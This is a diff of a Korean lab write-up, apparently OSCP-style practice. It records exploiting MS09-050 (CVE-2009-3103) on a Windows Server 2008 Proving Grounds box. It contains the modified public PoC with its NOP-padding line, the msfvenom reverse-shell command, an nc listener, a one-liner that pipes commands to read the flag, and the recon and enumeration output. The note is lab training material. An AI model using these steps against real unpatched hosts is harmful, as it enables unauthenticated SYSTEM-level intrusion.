@@ -21,27 +21,48 @@ manual_cves: true
 tech_count: 4
 ---
 
-> [!info] 상단 요약
+> [!info] 요약
 > 타겟 `192.168.248.40` (2026-08-21 인스턴스) · Windows Server 2008 SP1 (6.0.6001) · PG Fundamental · 플래그 1개
-> 진입: **MS09-050 / CVE-2009-3103** — `srv2.sys` SMBv2 negotiate 원격 커널 RCE. 공개 PoC(EDB 40280)를 수동으로 고쳐 리버스셸을 붙였다. 진입 즉시 `NT AUTHORITY\SYSTEM` — 별도 권한상승 없음.
-> **flag(proof.txt)**: `f4afb9b13d59235cb9c8892707256f7d` — `C:\Users\Administrator\Desktop\proof.txt`, 대화형 cmd 에서 `type` 으로 회수. (2026-08-21 인스턴스 값)
-> 이 박스의 진짜 교훈은 6장에 있다 — 커널 익스플로잇의 불안정성(실패 시 BSOD→자동 재부팅), 트리거/injection 계층 분리, revert 반영 검산.
+> 진입점: MS09-050 / CVE-2009-3103 — `srv2.sys` SMBv2 negotiate 원격 커널 RCE. 공개 PoC(EDB 40280)를 수동 손질해 `msfvenom` 리버스셸로 교체, 진입 즉시 `NT AUTHORITY\SYSTEM`
+> 권한상승: 불필요 — 커널 RCE 라 진입 자체가 SYSTEM
+> 시행착오·교훈 → [[_PLAYBOOK]]
 
-## 0. 이 박스에서 배우는 것
+## Target #1 – 192.168.248.40
 
-- **오래된 Windows 는 nmap 배너 대신 SMB 취약 스크립트가 진입점을 준다.** `smb-vuln-cve2009-3103` 한 줄이 경로 전부다.
-- **공개 커널 익스플로잇을 그대로 실행하지 말고 소스를 읽어라.** EDB 40280 은 shellcode 가 옛 LHOST 로 하드코딩돼 있고 `smb` python2 모듈에 의존한다. shellcode 를 갈아끼우면 **패킷 길이 필드와 안 맞아** 조용히 실패한다.
-- **커널 익스플로잇은 재현하지 마라.** CVE-2009-3103 은 "code execution **or system crash**". 한 번 성공하면 그걸로 끝내라 — 재시도가 `srv2.sys` 를 죽여 스스로 진입로를 닫는다. 이 노트의 6장이 그 실패 기록이다.
-- **시험 출제 가능성**: MS08-067·MS09-050·MS17-010 계열의 SMB 원격 RCE 는 OSCP 구형 Windows 박스의 단골이다. 변형은 "nmap `--script vuln` 이 CVE 하나를 콕 집어주고, 나머지는 exploit-db PoC 손질"이다.
+### Initial Access – SMBv2 NEGOTIATE 커널 결함(CVE-2009-3103)을 수동 손질한 공개 PoC 로 트리거해 무인증 원격 SYSTEM 획득
 
-## 1. 정찰
+**Vulnerability Explanation:**
+- `srv2.sys`(SMBv2 커널 드라이버)의 SMB2 NEGOTIATE 요청 처리 결함 — `Process ID High` 필드에 `&`(0x26)를 넣으면 방언 배열 인덱싱에서 범위 밖 메모리를 역참조(array index error)
+- 인증 불필요. 커널 모드에서 실행되므로 성공 시 컨텍스트가 곧 `NT AUTHORITY\SYSTEM`. 실패하면 BSOD(시스템 크래시)
+- 메모리 손상 익스플로잇이라 성공/크래시가 확률적 — 이 인스턴스는 실패 시 자동으로 BSOD → 재부팅(~90초) → `srv2.sys` 재생 사이클을 보였음(`Privilege Escalation` 절 아래 근거)
 
-### Nmap
+**Vulnerability Fix:**
+- MS09-050 패치(2009) 적용 또는 취약 세대 OS(2008 SP1/Vista) 폐기 — 이 인스턴스는 `Hotfix(s): N/A`(패치 전무)
+- 445/139 를 인터넷·비신뢰 세그먼트에 노출 금지. 레거시가 불가피하면 SMBv1 비활성화 + 최신 방언 강제, 호스트 방화벽으로 SMB 관리망만 허용
 
-```
-# nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.40
+**Severity:** Critical — 무인증 원격 커널 RCE, 진입 즉시 SYSTEM
+
+**Steps to reproduce the attack:**
+1. `nmap --script smb-vuln-cve2009-3103` 로 CVE-2009-3103 취약 확정
+2. EDB 40280(`ohnozzy/Exploit MS09_050.py`)의 shellcode 를 `msfvenom windows/shell_reverse_tcp` 출력(324B)으로 교체, NetBIOS 선언 길이(0x39e)에 맞춰 원본 길이(354B)까지 NOP 패딩
+3. `nc -lvnp 443` 리스너 대기
+4. 패치본을 445 에 발사 → `rpcclient` 인증 시도가 후킹된 코드를 트리거 → 콜백
+5. 콜백 즉시 stdin 사전 주입으로 `type proof.txt` 자동 실행 — 커널 익스플로잇은 재시도 시 `srv2.sys` 를 죽이므로 첫 셸에서 바로 회수해야 함([[_PLAYBOOK#B-24. 커널 익스플로잇은 «한 발»이다 — 재시도가 스스로 문을 닫는다]])
+
+### Service Enumeration
+
+**Port Scan Results**
+
+| IP Address | Ports Open |
+|---|---|
+| 192.168.248.40 | TCP: 53, 135, 139, 445, 3389, 5357 |
+
+```text
+# Nmap 7.98 scan initiated Fri Aug 21 00:52:48 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.40
+Warning: 192.168.248.40 giving up on port because retransmission cap hit (10).
 Nmap scan report for 192.168.248.40
 Host is up (0.084s latency).
+Not shown: 65521 closed tcp ports (reset)
 PORT      STATE    SERVICE       VERSION
 53/tcp    open     domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
 135/tcp   open     msrpc         Microsoft Windows RPC
@@ -49,97 +70,90 @@ PORT      STATE    SERVICE       VERSION
 445/tcp   open     microsoft-ds  Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
 3389/tcp  open     ms-wbt-server Microsoft Terminal Service
 5357/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-49152-49158/tcp open     unknown                 (동적 RPC 포트, 부팅마다 바뀜)
+49152/tcp open     unknown
+49153/tcp open     unknown
+49154/tcp open     unknown
+49155/tcp open     unknown
+49156/tcp open     unknown
+49157/tcp open     unknown
+49158/tcp open     unknown
 53173/tcp filtered unknown
-Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1
+Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2
 ```
-출처: `~/PG/Internal/nmap.log` (전 포트 스캔, 144초, `--min-rate 5000` 이라 `retransmission cap hit` 경고가 떴다). 49152–49158 은 이 스캔에서 `open unknown` 으로만 잡혔다(`-sCV` 가 서비스 지문을 못 떴다). `53173/tcp filtered` 는 그 스캔에서 한 번 잡힌 blip 으로 그 포트를 겨눈 재스캔은 하지 않았다 — 스캔 노이즈로 판단하고 445 경로에 집중했다.
+— 출처: `~/PG/Internal/nmap.log`(전 포트, 144초. OS 지문·TRACEROUTE 절은 생략). `49152–49158` 은 동적 RPC(부팅마다 변동, 색인 제외 대상). `53173/tcp filtered` 는 이 스캔의 단발 blip — 재스캔 미시도[관측 없음], 445 경로에 집중.
 
-읽는 법: `6.0.6001` 은 **Windows Server 2008 SP1**(빌드 6001)이다. 이 빌드대는 SMBv2 가 처음 실려 나온 세대이고, 바로 그 초기 `srv2.sys` 가 CVE-2009-3103 에 취약하다. 445 가 열려 있고 인증 정보가 없으니 **무인증 SMB RCE** 를 최우선으로 본다.
+`6.0.6001` = Windows Server 2008 SP1(빌드 6001). 이 빌드대가 SMBv2 초기 세대라 `srv2.sys` 결함(CVE-2009-3103)의 대상.
 
-### 서비스 식별 — 버전 판정 근거 2개
+**버전 판정 — 독립 근거 2개**
 
-버전을 배너 하나로 믿지 않는다.
+근거① 위 `-sCV` 스캔의 **53/tcp DNS 배너** — `Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)`. SMB 와 무관한 별개 서비스가 같은 빌드를 밝힘.
+근거② 별도 스크립트 스캔의 `smb-os-discovery` — 아래.
 
-1. `nmap -sCV` 의 `smb-os-discovery`: `Windows Server (R) 2008 Standard 6001 Service Pack 1`.
-2. 별도 스크립트 스캔으로 SMB 방언(dialect)을 직접 물었다 — 정상 상태에서 **SMBv1(NT LM 0.12) + SMBv2(2.0.2) 둘 다** 협상됐다(아래). SMBv2 가 살아 있다는 것이 CVE-2009-3103 의 전제다.
-
-```
+```text
 # nmap -Pn -p445 --script smb-vuln-cve2009-3103,smb-os-discovery,smb-protocols 192.168.248.40
+Host script results:
 | smb-protocols:
 |   dialects:
 |     NT LM 0.12 (SMBv1) [dangerous, but default]
 |_    2.0.2
+| smb-os-discovery:
+|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
+|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+|   Computer name: internal
+|   NetBIOS computer name: INTERNAL\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-08-20T08:53:58-07:00
 | smb-vuln-cve2009-3103:
 |   VULNERABLE:
 |   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
 |     State: VULNERABLE
 |     IDs:  CVE:CVE-2009-3103
 ```
-출처: `~/PG/Internal/nmap_smbvuln.log`. 이 `2.0.2` 방언 줄을 **6장에서 다시 인용한다** — 익스플로잇 후 여기서 `2.0.2` 가 사라지는 것이 `srv2.sys` 가 죽었다는 증거다.
+— 출처: `~/PG/Internal/nmap_smbvuln.log`. `smb-os-discovery` 배너("2008 Standard 6001 SP1")가 근거②.
 
-### 열거
+`smb-protocols` 의 dialects 목록은 버전 근거가 아니라 **취약성의 전제**임 — SMBv1(`NT LM 0.12`)과 SMBv2(`2.0.2`)가 둘 다 정상 협상돼야 PoC 가 SMBv1 negotiate 에 `SMB 2.002` 방언을 실어 `srv2.sys` 핸들러로 밀어넣을 수 있음. 이 `2.0.2` 줄을 `Privilege Escalation` 절에서 다시 인용함 — 이후 사라지는 것이 `srv2.sys` 가 죽었다는 증거.
 
-- 5357/tcp 는 WSDAPI(`Microsoft-HTTPAPI/2.0`)로 `Service Unavailable` 만 뱉는다. 웹 UI 가 아니다 — 스크린샷 대상이 없다.
-- 3389(RDP) 는 인증 정보가 없어 진입로가 못 된다.
-- 49152–49158 은 Windows 동적 RPC 포트(부팅마다 바뀜). 색인에서 제외되는 게 정상이다.
+**그 밖의 엔드포인트**
+- 5357/tcp — WSDAPI(`Microsoft-HTTPAPI/2.0`), `Service Unavailable` 만 반환. 웹 UI 아님
+- 3389(RDP) — 인증 정보 없어 진입로 불가
+- 49152–49158 — Windows 동적 RPC(부팅마다 변동)
 
-경로는 하나로 좁혀진다: **445 SMBv2 커널 RCE**.
+경로는 445 SMBv2 커널 RCE 하나로 좁혀짐. 볼트 `파일보관\` 에 이 박스 스크린샷은 없음[관측 없음] — 웹 UI 가 없어 대상 화면 자체가 없었고 원격 셸은 SSH 로 헤드리스로만 다뤄짐.
 
-## 2. 취약점 분석
+### Initial Access – MS09-050 SMBv2 커널 RCE 재현
 
-### 배경 — CVE-2009-3103 (MS09-050)
+공개 PoC(EDB 40280, `searchsploit ms09-050` → `windows/remote/40280.py`)를 그대로 실행하지 않고 먼저 읽었음. 핵심 구조:
+- `buff` 는 손으로 짠 SMBv1 헤더(`\xffSMB`, 명령 0x72=Negotiate)에 `"SMB 2.002"` 방언 문자열을 실어 SMBv2 negotiate 핸들러로 밀어 넣음. `\x17\x02`(high process ID)·`\xb4\xff\xff\x3f`(magic index)·`\x09\x0d\xd0\xff`(return address)가 취약 인덱스를 겨눔
+- metasploit 의 `stager_sysenter_hook` 이 뒤따름 — `sysenter` 를 후킹해 유저 프로세스가 syscall 할 때 shellcode 를 복사·실행. 스테이저는 `0x216`(534) 바이트를 복사
+- 마지막에 `subprocess.call("... rpcclient -U Administrator <target>")` — 인증 이벤트로 후킹된 코드를 트리거. 인증 성공 여부는 무관
 
-`srv2.sys`(SMBv2 커널 드라이버)의 **SMB2 NEGOTIATE 요청 처리** 결함이다. 요청 헤더의 `Process ID High` 필드에 특수 바이트(`&`, 0x26)를 넣으면 드라이버가 방언 배열을 인덱싱할 때 **범위 밖 메모리를 역참조**한다(array index error). 공격자가 이 인덱스와 그 위치의 값을 조종할 수 있어 **원격·무인증·커널 모드 코드 실행**으로 이어진다. 커널에서 실행되므로 성공 시 컨텍스트는 사실상 `NT AUTHORITY\SYSTEM`. 실패하면 BSOD(시스템 크래시).
+원본 PoC 결함 둘: ① shellcode 가 옛 LHOST(meterpreter) 하드코딩 → 교체 필요. ② `from smb.SMBConnection import SMBConnection` — 이 Kali python2 에 `pysmb` 없어(`ImportError`) 즉사. 실제로 안 쓰는 import 라 수정본에서 삭제 — 트리거는 `subprocess` 로 `rpcclient` 를 직접 부르므로 불필요.
 
-### PoC 구조 — EDB 40280 을 읽고 무엇을 하는지 먼저 이해한다
+**길이 제약 — 조용한 실패의 원인.** `buff` 맨 앞 NetBIOS 세션 길이 필드가 `\x00\x00\x03\x9e`(0x39e=926)로 고정. 원본 shellcode 는 354바이트인데 `msfvenom` 출력은 324바이트 — 30바이트 짧아 그대로 보내면 선언 길이만큼 안 채워진 패킷이 되어 **취약 코드 경로까지 도달은 하지만 트리거가 조용히 실패**함(콜백 없음). NOP(`\x90`)로 354까지 패딩하자 곧바로 셸이 붙었음. pcap 으로 재보면 패딩 전 injection 은 TCP length 900(SMB 본문 896B, 선언값보다 30B 부족), 패딩 후는 930(본문 926B = `0x39e` 와 일치) — 콜백은 930B 발사에서만 확인됨.
 
-`searchsploit ms09-050` → `windows/remote/40280.py`(ohnozzy 의 `MS09_050.py`). 소스를 열어 본 핵심:
-
-- `buff` 는 손으로 짠 **SMBv1 헤더**(`\xffSMB`, 명령 0x72 = Negotiate)에 `"SMB 2.002"` 방언 문자열을 실어 서버를 **SMBv2 negotiate 핸들러로 밀어 넣는다**. 그 안에 `\x17\x02` (high process ID)와 `\xb4\xff\xff\x3f` (magic index), `\x09\x0d\xd0\xff` (return address)가 박혀 있다 — 이게 취약 인덱스를 겨눈다.
-- 그다음 **metasploit 의 `stager_sysenter_hook`** 이 붙는다. 이 스테이저가 `sysenter` 를 후킹해 유저 프로세스가 syscall 을 할 때 최종 shellcode 를 복사·실행한다. 소스 주석대로 스테이저는 **0x216(534) 바이트**를 복사한다.
-- 마지막에 `subprocess.call("echo '...' | rpcclient -U Administrator <target>")` — **인증 이벤트를 일으켜 후킹된 코드를 트리거**한다. 인증 성공 여부는 상관없다(주석에 그렇게 적혀 있다).
-
-문제 둘:
-1. shellcode 가 **옛 LHOST(192.168.30.77 / meterpreter)** 로 하드코딩. 갈아끼워야 한다.
-2. `from smb.SMBConnection import SMBConnection` — 이 PoC 는 실제로는 이 모듈을 쓰지 않는데 맨 위에서 import 한다. 이 Kali python2 에는 `pysmb` 가 없어(`python2 -c 'from smb.SMBConnection import SMBConnection'` → `ImportError: No module named smb.SMBConnection`) 그 줄이 그대로면 즉사한다. 안 쓰는 import 라 수정본에서 **그 줄을 지웠다** — 트리거는 `subprocess` 로 `rpcclient`/`smbclient` 를 직접 부르므로 pysmb 는 필요 없다.
-
-### 왜 이 페이로드인가 — 길이 제약이 핵심 함정
-
-원본 shellcode 는 **354 바이트**다. `buff` 맨 앞의 NetBIOS 세션 길이 필드가 `\x00\x00\x03\x9e`(= 0x39e = 926)로 **고정**돼 있고, 그 뒤 스테이저(`0x216` = 534B 복사)와 shellcode 길이가 이 총합에 맞물린다. 내 `msfvenom windows/shell_reverse_tcp` shellcode 는 **324 바이트** — 30바이트 짧다. 그대로 보내면 서버가 선언된 길이만큼 안 채워진 패킷을 받아 **취약 코드 경로까지 도달은 하지만 트리거가 조용히 실패**한다(콜백 없음). 뒤에 NOP(`\x90`)로 354까지 패딩하자 곧바로 셸이 붙었다.
-
-패킷으로 재보면 정확히 들어맞는다(6장 pcap): 패딩 전 발사의 TCP 페이로드는 **900B**(NetBIOS 헤더 4B를 빼면 SMB 본문 896B — 선언한 926B 보다 30B 부족), 패딩 후는 **930B**(본문 926B = `0x39e` 로 선언값과 일치). 콜백은 930B 발사에서만 떴다.
-
-## 3. Foothold (진입은 성공, 세션 유지는 실패)
-
-### 리버스셸 shellcode 생성
-
-```
+```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.207 LPORT=443 EXITFUNC=thread -f python -v shell
+```
+```text
 [-] No arch selected, selecting arch: x86 from the payload
 Payload size: 324 bytes
 ```
-출처: `~/PG/Internal/msfvenom_shellcode.txt`. `msfvenom` 은 페이로드 생성기라 전 대상 허용(시험 규정). **msfconsole/meterpreter 는 쓰지 않았다.**
+— 출처: `~/PG/Internal/msfvenom_shellcode.txt`. `msfvenom` 은 페이로드 생성기라 전 대상 허용(시험 규정) — `msfconsole`/`meterpreter` 는 쓰지 않음.
 
-### PoC 수정본
-
-`~/PG/Internal/exploits/ms09_050_revshell.py` — 40280 의 shellcode 만 위 msfvenom 출력으로 교체. 그다음 길이 문제로 `ms09_050_revshell_pad.py` 를 만들어 shellcode 뒤에 NOP 패딩:
-
+수정본 `~/PG/Internal/exploits/ms09_050_revshell_pad.py` 의 패딩 라인:
 ```python
 shell += "\x90"*(354-len(shell))  # pad so packet length matches declared NetBIOS len 0x39e
 buff+=shell
 ```
 
-### 리스너 (tmux 안, 443)
-
-```
+리스너(tmux 안, 443):
+```bash
 sudo nc -lvnp 443
 ```
-아웃바운드 443 은 열려 있었다 — tcpdump 로 connect-back SYN 을 확인했다(6장). LPORT 를 80/53 으로 바꿀 필요는 없었다.
+아웃바운드 443 은 정상 — tcpdump 로 connect-back SYN 확인(아래). 포트 교체(80/53) 불필요.
 
-### 발사와 콜백
-
-```
+발사:
+```text
 # python2 exploits/ms09_050_revshell_pad.py 192.168.248.40
 Password for [WORKGROUP\Administrator]:
 Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
@@ -148,10 +162,18 @@ Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
 [*] triggering via rpcclient auth attempt
 [*] done
 ```
-`NT_STATUS_LOGON_FAILURE` 는 **정상이다** — rpcclient 는 인증에 실패해도 그 인증 시도 자체가 후킹된 코드를 트리거한다.
+— 출처: `~/PG/Internal/try3_ms09050_padded.log`. `NT_STATUS_LOGON_FAILURE` 는 정상 — `rpcclient` 가 인증에 실패해도 그 시도 자체가 후킹된 코드를 트리거함.
 
-리스너에 붙은 것(출처 `~/PG/Internal/listener_443.log`):
+`tcpdump -i tun0` 를 계속 걸어둔 채 확인한 실제 패킷(try2.pcap, 이 캡처는 패딩 전 실패 발사와 뒤이은 패딩본 성공 콜백을 모두 담고 있음):
+```text
+00:56:05.243188 IP 192.168.45.207.38106 > 192.168.248.40.445: Flags [P.], seq 1:901, ..., length 900   ← 패딩 전, 콜백 없음
+00:57:33.497313 IP 192.168.45.207.56398 > 192.168.248.40.445: Flags [P.], seq 1:931, ..., length 930   ← 패딩 후
+00:57:33.867319 IP 192.168.248.40.49159 > 192.168.45.207.443: Flags [S], ...                            ← 콜백 SYN, 930B 발사 직후
 ```
+— 출처: `~/PG/Internal/try2.pcap`(`sudo tcpdump -nn -r try2.pcap`)
+
+리스너에 붙은 것:
+```text
 listening on [any] 443 ...
 connect to [192.168.45.207] from (UNKNOWN) [192.168.248.40] 49159
 Microsoft Windows [Version 6.0.6001]
@@ -159,187 +181,121 @@ Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32>
 ```
-대화형 `cmd.exe` 프롬프트가 떴다. 컨텍스트는 `whoami` 로 확인했다 — **`nt authority\system`**. MS09-050 이 커널 모드 익스플로잇이라 예상대로 최고 권한이다.
+— 출처: `~/PG/Internal/listener_443.log`. `nc` 로 받은 **대화형 `cmd.exe` 세션 캡처**(웹셸 아님) — 프롬프트가 타겟이 보낸 실측 바이트임. Windows `cmd` 라 유닉스 pty 는 개입하지 않음. 컨텍스트는 `whoami` 로 확인 — `nt authority\system`.
 
-> [!danger] 셸이 짧게 산다 — 명령을 **미리 stdin 으로 먹여라**
-> 이 커널 주입 셸은 수 초 만에 죽는 경우가 잦다(호스트가 불안정). `tmux send-keys` 로 한 명령씩 왕복하면 라운드트립 지연 사이에 셸이 끊긴다(실제로 첫 셸을 이렇게 잃었다 — 6장). 해법은 리스너의 **stdin 을 미리 채워두는 것**:
-> ```bash
-> { sleep 4; echo 'type C:\Users\Administrator\Desktop\proof.txt';
->   sleep 4; echo 'whoami & hostname & ipconfig | findstr IPv4 & date /t & time /t & type C:\...\proof.txt';
->   sleep 900; } | sudo nc -lvnp 443 | tee shell_auto.txt
-> ```
-> 콜백이 붙는 즉시 `sleep` 타이머대로 명령이 흘러 들어가 **연결 4초 뒤 플래그가 회수**된다. 이 방식으로 한 화면에 증거를 다 담았다(`~/PG/Internal/flag_evidence.txt`):
-> ```
-> C:\Windows\system32>whoami & hostname & ipconfig | findstr IPv4 & date /t & time /t & type C:\Users\Administrator\Desktop\proof.txt
-> nt authority\system
-> internal
->    IPv4 Address. . . . . . . . . . . : 192.168.248.40
-> Thu 08/20/2026
-> 10:03 AM
-> f4afb9b13d59235cb9c8892707256f7d
-> ```
-> (타겟 시간대는 UTC-7 이라 날짜가 `08/20` 로 찍힌다 — Kali/KST(UTC+9) 기준 08/21 새벽 02:03 과 같은 순간이다. `smb-os-discovery` 의 `System time … -07:00` 으로 확인. 8월이라 PDT 다. 6장의 타임존 주의 참조.)
+이 셸은 수 초 만에 죽는 경우가 잦아(호스트가 불안정) 대화형으로 명령을 왕복시키지 않고 리스너 stdin 을 미리 채워 콜백 즉시 자동 실행되게 함([[_PLAYBOOK#A-34. 셸이 수 초만 산다 — stdin 을 미리 채워 자동 실행시킨다]] 참조). 실제 회수 화면과 값은 `Post-Exploitation` 절.
 
-## 4. 권한상승
+**Local.txt value:** 없음 — 이 박스는 진입 즉시 SYSTEM 이라 별도 user 플래그가 없음. `dir /b /s C:\Users\proof.txt` 전수 탐색 결과 `C:\Users\Administrator\Desktop\proof.txt` 단일 파일만 확인됨(PG 단일 플래그 표준 위치, 슬롯 1개).
 
-**해당 없음.** MS09-050 은 커널 RCE 라 진입 자체가 `NT AUTHORITY\SYSTEM` 이다 — 이 박스가 Fundamental 인 이유. 열거는 학습용으로만 돌렸다(아래).
+### Privilege Escalation – 불필요 (커널 RCE 로 진입 자체가 SYSTEM)
 
-### SYSTEM 컨텍스트 열거 — cmd 내장으로
+**Vulnerability Explanation:** 별도 권한상승 취약점 없음. MS09-050 이 **커널 모드** RCE 라 페이로드가 커널 컨텍스트에서 실행되고, 콜백 시점의 셸이 이미 `nt authority\system`(`listener_443.log` 직후 `whoami` 로 확인).
 
-`harvest.ps1` 을 돌리려 했으나 **이 호스트에는 PowerShell 이 설치돼 있지 않다.** Server 2008(비-R2)은 PowerShell 이 기본 미포함(선택 기능)이라, `dir C:\Windows\System32\WindowsPowerShell` 이 `File Not Found` 다. 그래서 cmd 내장 명령으로 대체 열거했다(`~/PG/Internal/harvest_admin.txt`, 234행). 핵심:
+**Vulnerability Fix:** 해당 없음 — `Initial Access` 의 Fix(MS09-050 패치 / 취약 세대 OS 폐기)가 이 항목도 함께 닫음.
 
-```
+**Severity:** 해당 없음 — 심각도는 `Initial Access` 에 계상(Critical).
+
+**Steps to reproduce the attack:** 해당 없음 — 추가 단계 없이 최초 셸이 SYSTEM. 아래 열거는 확인·학습용.
+
+`harvest.ps1` 을 돌리려 했으나 이 호스트에는 **PowerShell 이 설치돼 있지 않음.** Server 2008(비-R2)은 PowerShell 이 기본 미포함(선택 기능)이라 `dir C:\Windows\System32\WindowsPowerShell` 이 `File Not Found`. cmd 내장 명령으로 대체 열거(리스너 stdin 사전 주입 방식, `~/PG/Internal/harvest_admin.txt` 234행):
+
+```text
 C:\Windows\system32>whoami
 nt authority\system
 
-PRIVILEGES INFORMATION          (whoami /all 의 ~30행 중 Enabled 인 주요 항목만 발췌)
-SeCreateTokenPrivilege          Enabled
-SeTcbPrivilege                  Enabled
-SeImpersonatePrivilege          Enabled
-SeDebugPrivilege                Enabled
+C:\Windows\system32>whoami /all
 ...
+Privilege Name                  Description                                   State
+=============================== ============================================= ========
+SeCreateTokenPrivilege          Create a token object                         Enabled
+...
+SeTcbPrivilege                  Act as part of the operating system           Enabled
+...
+SeDebugPrivilege                Debug programs                                Enabled
+...
+SeImpersonatePrivilege          Impersonate a client after authentication     Enabled
+...
+
+C:\Windows\system32>net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+aaron                    Administrator            Guest
+jack                     niky                     tim
+The command completed with one or more errors.
 
 C:\Windows\system32>systeminfo
 OS Version:                6.0.6001 Service Pack 1 Build 6001
-Hotfix(s):                 N/A          <-- 패치가 하나도 없다
-
-C:\Windows\system32>net user
-aaron  Administrator  Guest  jack  niky  tim
+Hotfix(s):                 N/A
 ```
-`Hotfix(s): N/A` 가 MS09-050 이 통한 이유를 한 줄로 설명한다 — 이 호스트는 **핫픽스가 전무**하다. SYSTEM 이라 `SeCreateToken`·`SeTcb`·`SeImpersonate`·`SeDebug` 가 전부 켜져 있으나, 이미 최고 권한이라 쓸 데가 없다. `net user` 에 로컬 계정 6개(`aaron`·`jack`·`niky`·`tim` 등)가 보이지만 이 박스는 단일 플래그라 추가 회수 대상이 없다.
+— 출처: `~/PG/Internal/harvest_admin.txt`(발췌). `Hotfix(s): N/A` 가 MS09-050 이 통한 이유를 설명함 — 이 호스트는 핫픽스가 전무. 이미 SYSTEM 이라 `SeCreateToken`·`SeTcb`·`SeImpersonate`·`SeDebug` 등은 쓸 데가 없음. `net user` 의 로컬 계정 6개는 이 박스가 단일 플래그라 추가 회수 대상 아님.
 
-## 5. 플래그
+**이 인스턴스가 재시도-내성인 이유(근거)**: 실패한 발사마다 대상이 BSOD 후 자동 재부팅(~90초)해 `srv2.sys`/SMBv2 를 되살렸음. `smb2-capabilities`·`smb-protocols` 로 재생 여부를 판정.
 
-**`f4afb9b13d59235cb9c8892707256f7d`** — `C:\Users\Administrator\Desktop\proof.txt` (PG 단일 플래그 표준 위치). `dir /b /s C:\Users\proof.txt` 로 경로도 교차 확인했다.
-
-대화형 `cmd.exe`(웹셸 아님)에서 `type` 으로 읽었다 — OSCP 인정 형식. 획득 화면은 3장의 `flag_evidence.txt` 인용 참조(`whoami`/`hostname`/`ipconfig`/날짜와 한 화면). **2026-08-21 인스턴스 값**이다.
-
-## 6. 막혔던 지점 / 시행착오 — 이 노트의 핵심
-
-시간순. `~/PG/Internal/` 의 `try1`~`try8` 로그와 `try2.pcap` mtime 으로 재구성했다.
-
-**try1·try2 — shellcode 만 갈고 그냥 쏨 → 콜백 없음.**
-40280 의 shellcode 를 msfvenom 324B 로 교체하고 발사. rpcclient 는 `NT_STATUS_LOGON_FAILURE`(정상 트리거)를 냈지만 리스너에 아무것도 안 붙었다. 박스는 살아 있었다(`nmap -p445,3389` = open). 원인을 계층별로 분리하려 tcpdump 를 tun0 에 걸고 try2 를 다시 쐈다.
-
-**try2 pcap 분석 — injection 은 나가는데 콜백 SYN 이 없다.**
-tcpdump 를 tun0 에 계속 걸어둔 채(`sudo tcpdump -nn -r try2.pcap`) 발사했다. try2(패딩 전) injection 패킷은 `192.168.45.207.38106 > 192.168.248.40.445  Flags [P.], length 900` 하나로 정상 전송됐고, rpcclient 의 445 세션(negotiate/session-setup)도 정상. 그런데 그 발사 직후 구간에 타겟→Kali:443 콜백 SYN 이 하나도 없다. 즉 **injection 은 도달하나 shellcode 가 실행되지 않았다.** 아웃바운드 차단이 아니라(Kali↔타겟 445 왕복은 멀쩡) **페이로드 자체가 트리거 실패**다. 여기서 길이 필드를 의심했다. (이 capture 는 tcpdump 를 안 끄고 뒀던 탓에 뒤이은 패딩본 try3 의 **성공** 콜백까지 담고 있다 — 00:57:33 에 `192.168.248.40.49159 > …45.207.443 Flags [S]` 로 첫 SYN 이 뜨고 곧 배너가 흐른다. 두 발의 유일한 차이는 injection 길이 `900→930`.)
-
-**try3 — NOP 패딩 → 셸 획득 (약 3분 소요).**
-NetBIOS 선언 길이 `0x39e` 에 맞춰 shellcode 를 354B(원본 길이)로 패딩. 첫 시도에 `\x90` 문자를 소스에 직접 넣었다가 `SyntaxError: Non-ASCII character '\x90' ... no encoding declared`(python2 PEP-263) — 파일에 인코딩 선언이 없어서다. `sed` 로 `"\x90"*(354-len(shell))` 표현식을 넣어 해결. 재발사하자 곧바로 `C:\Windows\system32>` 콜백. **여기서 즉시 플래그를 읽었어야 했다.**
-
-**셸 상실 — 파이프와 `Ctrl-C` 두 실수.**
-증거 명령을 `whoami & hostname & ipconfig | findstr IPv4 & ...` 로 tmux `send-keys` 했는데, `send-keys` 가 `&` 를 `\&` 리터럴로 넘겨(cmd 가 백슬래시를 그대로 받음) 명령이 깨졌고, 파이프(`| findstr`)가 걸린 채 셸이 응답을 멈췄다. 복구하려 `tmux send-keys C-c` 를 보냈더니 **`Ctrl-C` 가 셸이 아니라 로컬 `nc` 프로세스를 죽였다** — `int_lis` tmux 세션째 사라지고 타겟 셸은 `FIN-WAIT-2` 로 끊겼다. 교훈 둘: (1) nc 리버스셸에 `|`·`&` 조합을 던지지 말 것, 필요하면 한 줄에 하나씩. (2) `Ctrl-C` 는 원격 셸이 아니라 로컬 nc 를 죽인다.
-
-**try4~try8 — 재익스플로잇 실패, 그리고 자멸.**
-셸을 잃고 같은 PoC 를 다시 쐈다. 이번엔 rpcclient 가 `NT_STATUS_IO_TIMEOUT`. 박스는 여전히 ping·445·3389 응답. `nmap --script smb-protocols` 를 다시 걸었더니:
+반복 발사 직후 — SMBv2 사망:
+```text
+Host script results:
+|_smb2-capabilities: SMB 2+ not supported
 ```
-| smb-protocols:
-|   dialects:
+— 출처: `~/PG/Internal/smb2_recheck.log`(01:36)
+
+재부팅 뒤 — SMBv2 재생:
+```text
+Host script results:
+| smb2-capabilities: 
+|   2.0.2: 
+|_    Distributed File System
+| smb-protocols: 
+|   dialects: 
 |     NT LM 0.12 (SMBv1) [dangerous, but default]
-|_
+|_    2.0.2
 ```
